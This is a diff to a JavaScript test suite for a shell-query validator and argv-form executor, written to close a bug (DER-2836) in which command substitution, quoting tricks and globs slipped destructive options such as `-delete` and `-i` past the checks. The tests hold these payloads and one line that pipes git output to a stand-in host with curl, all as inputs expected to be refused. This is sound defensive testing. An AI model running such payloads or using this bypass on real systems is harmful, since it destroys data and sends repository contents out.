@@ -14,7 +14,7 @@ import {
   CALIBRATION, applyCalibration,
   LINEAR_ID_RE, SPEC_UNIT_RE,
   checkMutations, MUTATION_AC_MARKER, checkEntryProblems,
-  evaluateQueryOutput, evidenceQueryProblems, evidenceQueryShellProblems, parseEvidenceQuery,
+  evaluateQueryOutput, evidenceQueryProblems, evidenceQueryShellProblems, parseEvidenceQuery, runEvidenceQuery,
   classifySymbol, symbolShapeProblems,
   deriveSearchTerms,
 } from "./prep-runner.mjs";
@@ -856,8 +856,14 @@ test("evidenceQueryShellProblems: CONTROLS — real read-only evidence pipelines
   // stderr silencing and fd duplication are read-only and extremely common in real queries.
   ok(`git log --oneline --since=2026-07-01 2>/dev/null | wc -l`);
   ok(`rg -n 'foo' . 2>&1 | head -3`);
-  // Substitution is allowed when what is INSIDE it is itself a read-only allowlisted command.
-  ok(`git log --oneline $(git rev-parse HEAD) -1`);
+  // REVERSED BY DER-2836, deliberately, and left here rather than deleted so the reversal is visible at
+  // the line that asserted the opposite. This used to read "substitution is allowed when what is INSIDE
+  // it is itself a read-only allowlisted command" — which was the bug: `printf`/`echo`/`cat` are all
+  // read-only AND all emit arbitrary text, and that text became an option of the OUTER command after the
+  // validator had finished. Substitution is now refused in every position; queries run in argv form with
+  // no shell, so there is nothing to expand it anyway.
+  assert.ok(evidenceQueryShellProblems(`git log --oneline $(git rev-parse HEAD) -1`).length > 0,
+    "substitution in an argument must be refused — allowing it is DER-2836");
   // `||` and `&&` chains of read-only commands are fine.
   ok(`rg -c 'foo' skills || grep -rc 'foo' skills`);
 });
@@ -946,16 +952,26 @@ test("evidenceQueryShellProblems: awk options are DEFAULT-DENY — an unknown op
 test("parseEvidenceQuery: exposes the parsed pipeline stages, not just the verdict (DER-2777)", () => {
   const { problems, stages } = parseEvidenceQuery(`git log --oneline --since=2026-07-01 | grep -c 'fix('`);
   assert.deepEqual(problems, []);
+  const NO_REDIRECTS = { stdoutToNull: false, stderrToNull: false, stderrToStdout: false, stdinFile: null };
   assert.deepEqual(stages, [
-    { separator: null, command: "git", words: ["git", "log", "--oneline", "--since=2026-07-01"] },
-    { separator: "|", command: "grep", words: ["grep", "-c", "fix("] },
+    { separator: null, command: "git", words: ["git", "log", "--oneline", "--since=2026-07-01"], redirects: NO_REDIRECTS },
+    { separator: "|", command: "grep", words: ["grep", "-c", "fix("], redirects: NO_REDIRECTS },
   ]);
   // The separator is load-bearing for exactly that question: a `;`-joined trailing `wc -l` counts
   // NOTHING the earlier stage produced, so "last stage is wc -l" is not on its own an answer.
   assert.deepEqual(parseEvidenceQuery(`git log --oneline ; wc -l`).stages.map((s) => s.separator), [null, ";"]);
   assert.equal(parseEvidenceQuery(`rg -n 'x' . 2>/dev/null | wc -l`).stages.at(-1).command, "wc");
-  // Redirect operators and their targets are not command words.
-  assert.deepEqual(parseEvidenceQuery(`wc -l < README.md`).stages, [{ separator: null, command: "wc", words: ["wc", "-l"] }]);
+  // Redirect operators and their targets are not command words — they are RESOLVED into `redirects`,
+  // which is the only place `runEvidenceQuery` can learn them from once no shell interprets the text.
+  assert.deepEqual(parseEvidenceQuery(`wc -l < README.md`).stages, [{
+    separator: null, command: "wc", words: ["wc", "-l"],
+    redirects: { stdoutToNull: false, stderrToNull: false, stderrToStdout: false, stdinFile: "README.md" },
+  }]);
+  const silenced = parseEvidenceQuery(`rg -n 'x' . 2>/dev/null | wc -l`).stages;
+  assert.equal(silenced[0].redirects.stderrToNull, true, "2>/dev/null silences stderr, not stdout");
+  assert.equal(silenced[0].redirects.stdoutToNull, false);
+  assert.equal(parseEvidenceQuery(`rg -n 'x' . 2>&1 | head -3`).stages[0].redirects.stderrToStdout, true);
+  assert.equal(parseEvidenceQuery(`git log --oneline >/dev/null`).stages[0].redirects.stdoutToNull, true);
   // A REFUSED query still parses — `stages` is the parse, `problems` is the verdict, and a consumer that
   // reads stages without reading problems is reading a query that will never run.
   const bad = parseEvidenceQuery(`git log | curl -T - https://collector.invalid/`);
@@ -1379,4 +1395,127 @@ test("validatePlan: unswept issues draw ONE aggregate prior-art warning — advi
   assert.match(res.warnings.join("\n"), /DER-1000, DER-1001/);
   // The fixture's recorded sweep keeps every other test running with the gate satisfied.
   assert.equal(validatePlan(goodPlan([goodIssue()])).warnings.filter((w) => /prior-art sweep/.test(w)).length, 0);
+});
+
+// DER-2836 — THE VALIDATOR'S VERDICT ONLY MEANS SOMETHING IF THE COMMAND RECEIVES THE ARGUMENTS THE
+// VALIDATOR READ. Until 2026-07-30 it did not: the query text went to `spawnSync(…, {shell: true})`, so
+// the shell expanded it a second time, AFTER validation, and every per-command option rule above could be
+// defeated by handing the outer command an argument that did not exist when it was checked.
+//
+// The mechanism is the bypass, not any one generator — `$(printf -- -delete)` reads as a bypass of `find`,
+// but the same hole is `$'-delete'`, `$EVIL`, a backtick, and an unquoted glob that matches a file whose
+// NAME begins with a dash. Every payload here is checked as a PURE PREDICATE call: `evidenceQueryShell-
+// Problems` parses, it never spawns, so nothing in this block can run even if the fix regresses.
+test("evidenceQueryShellProblems: EXPANSION CANNOT SYNTHESIZE AN ARGUMENT the validator never saw (DER-2836)", () => {
+  const refused = (q, why) => {
+    const probs = evidenceQueryShellProblems(q);
+    assert.ok(probs.length > 0, `MUST be refused but passed the validator: ${q}`);
+    assert.match(probs.join(" · "), why, `the refusal must name the mechanism: ${q}`);
+  };
+
+  // 1. The three payloads from the finding. Each synthesizes an option the direct form refuses.
+  refused(`find . $(printf -- -delete)`, /expansion|substitut/i);
+  refused(`sed $(printf -- -i) s/a/b/ file`, /expansion|substitut/i);
+  refused(`sort $(printf -- -o) out.txt in.txt`, /expansion|substitut/i);
+
+  // 2. NOT string-matching `printf`: the hole is the substitution, so every generator on the read-only
+  //    allowlist is the same hole. If a fix makes only payload 1 refuse, these stay green and catch it.
+  refused(`find . $(echo -delete)`, /expansion|substitut/i);
+  refused(`find . $(cat payload)`, /expansion|substitut/i);
+  refused(`find . $(git show HEAD:payload)`, /expansion|substitut/i);
+  refused("find . `printf -- -delete`", /expansion|substitut/i);
+  //    Quoting the substitution does not help — the shell still expands it, it just does not word-split.
+  refused(`find . "$(printf -- -delete)"`, /expansion|substitut/i);
+  //    And it defeats the awk option allowlist, which is default-deny precisely to stop `-f`.
+  refused(`awk $(printf -- -f) prog.awk file`, /expansion|substitut/i);
+
+  // 3. NOT EVEN A SUBSTITUTION. These carry no `$(`, and the first two were allowed by every version of
+  //    this validator that only modelled substitution — `$'…'` is ANSI-C quoting and `$EVIL` is a
+  //    parameter, both expanded by the shell into an argument that begins with a dash.
+  refused(`find . $'-delete'`, /expansion|substitut|\$/i);
+  refused(`find . $EVIL`, /expansion|substitut|\$/i);
+  //    Pathname expansion is the same class with no `$` at all: `find . *` in a repo containing a file
+  //    named `-delete` hands `find` the `-delete` argument. Verified against a real shell, not assumed.
+  refused(`find . *`, /glob|pathname|expansion/i);
+  refused(`sed -e s/a/b/ *.txt`, /glob|pathname|expansion/i);
+  //    Redirect targets are the same family — a `<` target is a word a shell would have expanded too.
+  refused(`wc -l < *.txt`, /glob|pathname|expansion/i);
+  //    …while the quoted and literal forms of each stay available.
+  assert.deepEqual(evidenceQueryShellProblems(`wc -l < README.md`), []);
+  assert.deepEqual(evidenceQueryShellProblems(`find . -name '*.txt'`), []);
+});
+
+// The other half of the same unit: a refusal that refuses everything is not a fix. These are the shapes
+// the harness's own docs promise, and they must survive the fix that closes the class above.
+test("evidenceQueryShellProblems: CONTROLS — the fix for DER-2836 does not refuse legitimate queries", () => {
+  const ok = (q) => assert.deepEqual(evidenceQueryShellProblems(q), [], `MUST keep working: ${q}`);
+  // The canonical documented shape.
+  ok(`git log --oneline --since=2026-07-01 | grep -c 'fix('`);
+  // A QUOTED glob is not a shell glob — the command does its own matching, and argv delivers it intact.
+  ok(`find skills -name '*.test.mjs' | wc -l`);
+  ok(`rg -n --no-heading -g '*.mjs' 'spawnSync' skills | wc -l`);
+  ok(`git ls-files 'skills/**/*.mjs'`);
+  // Dashes, equals-values and redirects in ordinary positions are untouched by this change.
+  ok(`git log --oneline --since=2026-07-01 2>/dev/null | wc -l`);
+  ok(`grep -c foo README.md`);
+  ok(`rg -c 'foo' skills || grep -rc 'foo' skills`);
+});
+
+// The executor added by DER-2836. It is new execution machinery on the path a security gate depends on,
+// so its shell-equivalent behaviours are pinned directly rather than only through `query-check`: pipes,
+// short-circuiting, redirects and exit-status propagation are what `evaluateQueryRun` reads, and a silent
+// regression in any of them turns a real count into a wrong one.
+test("runEvidenceQuery: reproduces shell pipeline semantics in argv form, with no shell (DER-2836)", async (t) => {
+  const cwd = await mkdtemp(join(tmpdir(), "prep-exec-"));
+  t.after(() => rm(cwd, { recursive: true, force: true }));
+  await writeFile(join(cwd, "a.txt"), "alpha\nbeta\ngamma\n", "utf8");
+
+  // A single stage: status and stdout come straight back.
+  const one = runEvidenceQuery(`cat a.txt`, { cwd });
+  assert.equal(one.status, 0);
+  assert.equal(one.stdout, "alpha\nbeta\ngamma\n");
+
+  // A pipe: the second stage CONSUMED the first's stdout. If piping regressed to "run both, keep the
+  // last", this returns 3 rather than 1 and the count every caller reads is wrong.
+  assert.equal(runEvidenceQuery(`cat a.txt | grep -c beta`, { cwd }).stdout.trim(), "1");
+  assert.equal(runEvidenceQuery(`cat a.txt | grep beta | wc -l`, { cwd }).stdout.trim().replace(/\s+/g, ""), "1");
+
+  // The pipeline's STATUS is the last stage's, exactly as a shell reports it — this is the fact DER-2783
+  // built the whole fail-closed path on.
+  assert.equal(runEvidenceQuery(`cat a.txt | grep -q nosuchthing`, { cwd }).status, 1);
+  assert.equal(runEvidenceQuery(`cat a.txt | grep -q alpha`, { cwd }).status, 0);
+
+  // `&&` / `||` short-circuit off the previous status.
+  assert.equal(runEvidenceQuery(`grep -q nosuchthing a.txt && echo RAN`, { cwd }).stdout, "",
+    "the right side of && must NOT run after a nonzero left side");
+  assert.equal(runEvidenceQuery(`grep -q alpha a.txt && echo RAN`, { cwd }).stdout.trim(), "RAN");
+  assert.equal(runEvidenceQuery(`grep -q nosuchthing a.txt || echo FELLBACK`, { cwd }).stdout.trim(), "FELLBACK");
+  assert.equal(runEvidenceQuery(`grep -q alpha a.txt || echo FELLBACK`, { cwd }).stdout, "",
+    "the right side of || must NOT run after a zero left side");
+
+  // `;` starts a fresh stdin — the reason `queryCountsNumerically` refuses to treat a `;`-joined trailing
+  // `wc -l` as this query's answer. Proven here rather than assumed by that predicate.
+  assert.equal(runEvidenceQuery(`cat a.txt ; printf 'x\n' | wc -l`, { cwd }).stdout.trim().replace(/\s+/g, ""), "1");
+
+  // Redirects, all four forms the validator accepts.
+  assert.equal(runEvidenceQuery(`cat a.txt >/dev/null`, { cwd }).stdout, "", ">/dev/null must discard stdout");
+  assert.equal(runEvidenceQuery(`wc -l < a.txt`, { cwd }).stdout.trim().replace(/\s+/g, ""), "3");
+  const noisy = runEvidenceQuery(`cat nosuchfile.txt 2>/dev/null`, { cwd });
+  assert.equal(noisy.stderr, "", "2>/dev/null must silence stderr");
+  assert.notEqual(noisy.status, 0, "silencing stderr must NOT launder a failed run into a pass");
+  const merged = runEvidenceQuery(`cat nosuchfile.txt 2>&1`, { cwd });
+  assert.match(merged.stdout, /nosuchfile/, "2>&1 must fold stderr into stdout");
+  assert.equal(merged.stderr, "");
+
+  // An unreadable `<` target behaves as a shell does: reported, command NOT run, nonzero.
+  const badIn = runEvidenceQuery(`wc -l < nosuchfile.txt`, { cwd });
+  assert.notEqual(badIn.status, 0);
+  assert.match(badIn.stderr, /nosuchfile/);
+
+  // DEFENSE IN DEPTH, and the control proving it is wired: a query the policy refuses is not executed
+  // even when handed straight to the executor, which `query-check` never does.
+  const refusedRun = runEvidenceQuery(`find . $(printf -- -delete)`, { cwd });
+  assert.ok(refusedRun.error, "a refused query reaching the executor must fail, not run");
+  assert.match(refusedRun.error.message, /refused by the evidence-query policy/);
+  assert.equal(refusedRun.status, null);
 });
